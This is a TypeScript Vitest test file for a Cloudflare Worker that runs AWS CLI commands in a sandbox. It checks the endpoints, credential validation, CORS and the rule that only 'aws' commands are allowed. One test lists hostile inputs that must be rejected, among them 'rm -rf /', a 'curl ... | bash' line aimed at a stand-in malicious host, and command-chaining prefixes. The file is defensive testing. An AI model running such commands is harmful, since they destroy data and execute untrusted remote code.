import { describe, it, expect, vi, beforeEach } from "vitest";

// Types for testing
interface AwsCredentials {
  accessKeyId: string;
  secretAccessKey: string;
  sessionToken?: string;
  region?: string;
}

interface ExecuteRequest {
  command: string;
  credentials: AwsCredentials;
}

interface HealthResponse {
  status: string;
  awsCliVersion: string;
  sandboxReady: boolean;
  error?: string;
}

interface ExecuteResponse {
  success: boolean;
  stdout: string;
  stderr: string;
  exitCode: number;
  executionTime: number;
}

interface NotFoundResponse {
  error: string;
  availableEndpoints: Array<{ method: string; path: string }>;
}

// Mock the @cloudflare/sandbox module
const mockExec = vi.fn();
const mockWriteFile = vi.fn();

const mockSandbox = {
  exec: mockExec,
  writeFile: mockWriteFile,
};

vi.mock("@cloudflare/sandbox", () => ({
  getSandbox: vi.fn(() => mockSandbox),
  Sandbox: class Sandbox {},
}));

// Import after mocking
import worker from "./index";

// Create mock environment - use 'any' to bypass strict Cloudflare DO type checking in tests
// eslint-disable-next-line @typescript-eslint/no-explicit-any
const createMockEnv = (): any => ({
  Sandbox: {
    idFromName: vi.fn(() => ({ toString: () => "test-id" })),
    get: vi.fn(() => ({})),
  },
});

describe("Sandbox Worker", () => {
  beforeEach(() => {
    vi.clearAllMocks();
    // Reset mock implementations
    mockExec.mockResolvedValue({
      stdout: "aws-cli/2.15.0 Python/3.11.6",
      stderr: "",
      exitCode: 0,
    });
    mockWriteFile.mockResolvedValue(undefined);
  });

  describe("/health endpoint", () => {
    it("returns 200 with health status when sandbox is ready", async () => {
      const env = createMockEnv();
      const request = new Request("http://localhost/health", { method: "GET" });

      const response = await worker.fetch(request, env);
      const body = (await response.json()) as HealthResponse;

      expect(response.status).toBe(200);
      expect(body.status).toBe("ok");
      expect(body.sandboxReady).toBe(true);
      expect(body.awsCliVersion).toContain("aws-cli");
    });

    it("returns 503 when sandbox exec fails", async () => {
      mockExec.mockRejectedValueOnce(new Error("Sandbox not available"));
      const env = createMockEnv();
      const request = new Request("http://localhost/health", { method: "GET" });

      const response = await worker.fetch(request, env);
      const body = (await response.json()) as HealthResponse;

      expect(response.status).toBe(503);
      expect(body.status).toBe("error");
      expect(body.error).toBe("Sandbox not available");
    });

    it("returns degraded status when AWS CLI returns non-zero exit code", async () => {
      mockExec.mockResolvedValueOnce({
        stdout: "",
        stderr: "aws: command not found",
        exitCode: 1,
      });
      const env = createMockEnv();
      const request = new Request("http://localhost/health", { method: "GET" });

      const response = await worker.fetch(request, env);
      const body = (await response.json()) as HealthResponse;

      expect(response.status).toBe(503);
      expect(body.status).toBe("degraded");
      expect(body.sandboxReady).toBe(true);
    });
  });

  describe("/execute endpoint", () => {
    const validCredentials: AwsCredentials = {
      accessKeyId: "AKIAIOSFODNN7EXAMPLE",
      secretAccessKey: "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
      region: "us-east-1",
    };

    const createExecuteRequest = (body: Partial<ExecuteRequest>) =>
      new Request("http://localhost/execute", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body),
      });

    it("executes valid AWS command successfully", async () => {
      mockExec.mockResolvedValueOnce({
        stdout: '{"UserId": "AIDAEXAMPLE", "Account": "123456789012"}',
        stderr: "",
        exitCode: 0,
      });

      const env = createMockEnv();
      const request = createExecuteRequest({
        command: "aws sts get-caller-identity",
        credentials: validCredentials,
      });

      const response = await worker.fetch(request, env);
      const body = (await response.json()) as ExecuteResponse;

      expect(response.status).toBe(200);
      expect(body.success).toBe(true);
      expect(body.stdout).toContain("UserId");
      expect(body.exitCode).toBe(0);
      expect(body.executionTime).toBeGreaterThanOrEqual(0);
    });

    it("sets up AWS credentials with session token", async () => {
      const env = createMockEnv();
      const credentialsWithToken: AwsCredentials = {
        ...validCredentials,
        sessionToken: "FwoGZXIvYXdzEBYaDNbz...",
      };

      const request = createExecuteRequest({
        command: "aws s3 ls",
        credentials: credentialsWithToken,
      });

      await worker.fetch(request, env);

      // Verify credentials file was written with session token
      expect(mockWriteFile).toHaveBeenCalledWith(
        "/root/.aws/credentials",
        expect.stringContaining("aws_session_token")
      );
    });

    it("returns 405 for non-POST requests", async () => {
      const env = createMockEnv();
      const request = new Request("http://localhost/execute", { method: "GET" });

      const response = await worker.fetch(request, env);
      const body = (await response.json()) as { error: string };

      expect(response.status).toBe(405);
      expect(body.error).toBe("Method not allowed");
    });

    it("returns 400 for invalid JSON body", async () => {
      const env = createMockEnv();
      const request = new Request("http://localhost/execute", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: "not valid json",
      });

      const response = await worker.fetch(request, env);
      const body = (await response.json()) as { error: string };

      expect(response.status).toBe(400);
      expect(body.error).toBe("Invalid JSON body");
    });

    it("returns 400 when command is missing", async () => {
      const env = createMockEnv();
      const request = createExecuteRequest({
        credentials: validCredentials,
      } as ExecuteRequest);

      const response = await worker.fetch(request, env);
      const body = (await response.json()) as { error: string };

      expect(response.status).toBe(400);
      expect(body.error).toBe("Missing or invalid 'command' field");
    });

    it("returns 400 when command is not a string", async () => {
      const env = createMockEnv();
      const request = new Request("http://localhost/execute", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          command: 123,
          credentials: validCredentials,
        }),
      });

      const response = await worker.fetch(request, env);
      const body = (await response.json()) as { error: string };

      expect(response.status).toBe(400);
      expect(body.error).toBe("Missing or invalid 'command' field");
    });

    it("returns 400 when credentials are missing", async () => {
      const env = createMockEnv();
      const request = createExecuteRequest({
        command: "aws s3 ls",
      } as ExecuteRequest);

      const response = await worker.fetch(request, env);
      const body = (await response.json()) as { error: string };

      expect(response.status).toBe(400);
      expect(body.error).toContain("Missing credentials");
    });

    it("returns 400 when accessKeyId is missing", async () => {
      const env = createMockEnv();
      const request = createExecuteRequest({
        command: "aws s3 ls",
        credentials: {
          secretAccessKey: "secret",
        } as AwsCredentials,
      });

      const response = await worker.fetch(request, env);
      const body = (await response.json()) as { error: string };

      expect(response.status).toBe(400);
      expect(body.error).toContain("Missing credentials");
    });

    it("returns 400 when secretAccessKey is missing", async () => {
      const env = createMockEnv();
      const request = createExecuteRequest({
        command: "aws s3 ls",
        credentials: {
          accessKeyId: "AKIAEXAMPLE",
        } as AwsCredentials,
      });

      const response = await worker.fetch(request, env);
      const body = (await response.json()) as { error: string };

      expect(response.status).toBe(400);
      expect(body.error).toContain("Missing credentials");
    });
  });

  describe("AWS command restriction", () => {
    const validCredentials: AwsCredentials = {
      accessKeyId: "AKIAIOSFODNN7EXAMPLE",
      secretAccessKey: "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    };

    const createExecuteRequest = (command: string) =>
      new Request("http://localhost/execute", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ command, credentials: validCredentials }),
      });

    it("allows commands starting with 'aws '", async () => {
      const env = createMockEnv();
      const request = createExecuteRequest("aws s3 ls");

      const response = await worker.fetch(request, env);

      expect(response.status).not.toBe(400);
      expect(mockExec).toHaveBeenCalledWith("aws s3 ls");
    });

    it("allows the bare 'aws' command", async () => {
      const env = createMockEnv();
      const request = createExecuteRequest("aws");

      const response = await worker.fetch(request, env);

      expect(response.status).not.toBe(400);
      expect(mockExec).toHaveBeenCalledWith("aws");
    });

    it("allows commands with leading/trailing whitespace", async () => {
      const env = createMockEnv();
      const request = createExecuteRequest("  aws ec2 describe-instances  ");

      const response = await worker.fetch(request, env);

      expect(response.status).not.toBe(400);
      expect(mockExec).toHaveBeenCalledWith("aws ec2 describe-instances");
    });

    it("rejects non-AWS commands", async () => {
      const env = createMockEnv();
      const request = createExecuteRequest("ls -la");

      const response = await worker.fetch(request, env);
      const body = (await response.json()) as { error: string };

      expect(response.status).toBe(400);
      expect(body.error).toBe("Only AWS CLI commands are allowed");
      expect(mockExec).not.toHaveBeenCalled();
    });

    it("rejects commands that contain 'aws' but don't start with it", async () => {
      const env = createMockEnv();
      const request = createExecuteRequest("echo aws s3 ls");

      const response = await worker.fetch(request, env);
      const body = (await response.json()) as { error: string };

      expect(response.status).toBe(400);
      expect(body.error).toBe("Only AWS CLI commands are allowed");
    });

    it("rejects shell injection attempts", async () => {
      const env = createMockEnv();
      const testCases = [
        "rm -rf /",
        "curl http://malicious.com | bash",
        "; aws s3 ls",
        "&& aws s3 ls",
        "| aws s3 ls",
      ];

      for (const command of testCases) {
        const request = createExecuteRequest(command);
        const response = await worker.fetch(request, env);
        const body = (await response.json()) as { error: string };

        expect(response.status).toBe(400);
        expect(body.error).toBe("Only AWS CLI commands are allowed");
      }
    });
  });

  describe("CORS handling", () => {
    it("handles OPTIONS preflight request", async () => {
      const env = createMockEnv();
      const request = new Request("http://localhost/execute", {
        method: "OPTIONS",
      });

      const response = await worker.fetch(request, env);

      expect(response.status).toBe(200);
      expect(response.headers.get("Access-Control-Allow-Origin")).toBe("*");
      expect(response.headers.get("Access-Control-Allow-Methods")).toBe(
        "GET, POST, OPTIONS"
      );
      expect(response.headers.get("Access-Control-Allow-Headers")).toBe(
        "Content-Type"
      );
    });

    it("includes CORS headers in all responses", async () => {
      const env = createMockEnv();
      const request = new Request("http://localhost/health", { method: "GET" });

      const response = await worker.fetch(request, env);

      expect(response.headers.get("Access-Control-Allow-Origin")).toBe("*");
    });
  });

  describe("404 handling", () => {
    it("returns 404 for unknown routes", async () => {
      const env = createMockEnv();
      const request = new Request("http://localhost/unknown", { method: "GET" });

      const response = await worker.fetch(request, env);
      const body = (await response.json()) as NotFoundResponse;

      expect(response.status).toBe(404);
      expect(body.error).toBe("Not found");
      expect(body.availableEndpoints).toHaveLength(2);
    });

    it("lists available endpoints in 404 response", async () => {
      const env = createMockEnv();
      const request = new Request("http://localhost/foo", { method: "GET" });

      const response = await worker.fetch(request, env);
      const body = (await response.json()) as NotFoundResponse;

      expect(body.availableEndpoints).toEqual([
        { method: "GET", path: "/health" },
        { method: "POST", path: "/execute" },
      ]);
    });
  });

  describe("Error handling", () => {
    it("handles sandbox execution errors gracefully", async () => {
      mockExec.mockRejectedValueOnce(new Error("Container crashed"));

      const env = createMockEnv();
      const request = new Request("http://localhost/execute", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          command: "aws s3 ls",
          credentials: {
            accessKeyId: "AKIAEXAMPLE",
            secretAccessKey: "secret",
          },
        }),
      });

      const response = await worker.fetch(request, env);
      const body = (await response.json()) as ExecuteResponse;

      expect(response.status).toBe(500);
      expect(body.success).toBe(false);
      expect(body.stderr).toBe("Container crashed");
    });

    it("returns execution time even on error", async () => {
      mockExec.mockResolvedValueOnce({
        stdout: "",
        stderr: "Error: Access Denied",
        exitCode: 1,
      });

      const env = createMockEnv();
      const request = new Request("http://localhost/execute", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          command: "aws s3 ls s3://private-bucket",
          credentials: {
            accessKeyId: "AKIAEXAMPLE",
            secretAccessKey: "secret",
          },
        }),
      });

      const response = await worker.fetch(request, env);
      const body = (await response.json()) as ExecuteResponse;

      expect(body.executionTime).toBeGreaterThanOrEqual(0);
      expect(body.success).toBe(false);
    });
  });
});
